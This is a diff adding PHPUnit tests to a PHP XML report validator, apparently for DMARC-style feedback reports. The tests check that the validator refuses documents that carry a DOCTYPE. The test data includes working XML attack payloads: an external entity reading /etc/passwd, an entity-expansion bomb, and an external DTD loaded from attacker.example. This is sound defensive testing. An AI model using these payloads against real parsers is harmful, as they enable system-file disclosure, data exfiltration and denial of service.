@@ -36,6 +36,35 @@ final class ReportXMLProcessorTest extends TestCase
         self::assertTrue($result);
     }
 
+    public function testValidateAcceptsAReportWithoutAnXmlDeclaration(): void
+    {
+        $processor = new ReportXMLProcessor(new TestLogger(), $this->schemaPath(), $this->rfc9990SchemaPath());
+        $withoutDeclaration = (string) preg_replace('/^<\?xml[^>]*\?>\s*/', '', $this->validXml());
+
+        self::assertStringStartsWith('<feedback', $withoutDeclaration);
+        self::assertTrue($processor->validate($withoutDeclaration));
+    }
+
+    /**
+     * @return iterable<string, array{string}>
+     */
+    public static function documentTypeProvider(): iterable
+    {
+        yield 'external entity' => ['<!DOCTYPE feedback [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>'];
+        yield 'entity expansion' => ['<!DOCTYPE feedback [<!ENTITY a "aaaaaaaaaa"><!ENTITY b "&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;">]>'];
+        yield 'external document type' => ['<!DOCTYPE feedback SYSTEM "http://attacker.example/report.dtd">'];
+        yield 'lower case and spaced' => ['<! doctype feedback>'];
+    }
+
+    #[\PHPUnit\Framework\Attributes\DataProvider('documentTypeProvider')]
+    public function testValidateRefusesADocumentType(string $documentType): void
+    {
+        $processor = new ReportXMLProcessor(new TestLogger(), $this->schemaPath(), $this->rfc9990SchemaPath());
+        $xml = (string) preg_replace('/^(<\?xml[^>]*\?>)/', '$1'.$documentType, $this->validXml());
+
+        self::assertFalse($processor->validate($xml));
+    }
+
     public function testValidateRejectsInvalidSourceIp(): void
     {
         $processor = new ReportXMLProcessor(new TestLogger(), $this->schemaPath(), $this->rfc9990SchemaPath());
